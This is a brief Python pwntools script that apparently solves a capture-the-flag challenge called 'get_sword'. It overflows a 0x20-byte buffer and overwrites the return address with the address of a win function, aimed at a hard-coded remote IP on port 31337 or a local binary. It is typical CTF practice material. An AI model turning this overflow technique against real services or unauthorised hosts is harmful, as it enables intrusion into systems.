from pwn import process, remote, p32

def exploit(boolean):
    if(boolean):
        r = remote('173.255.201.51', 31337)
    
    else:
        r = process('./get_sword')
    
    get_sword_addr = 0x08049218
    payload = b'A' * 0x20
    payload += p32(get_sword_addr)
    r.sendline(payload)
    r.interactive()


exploit(True)
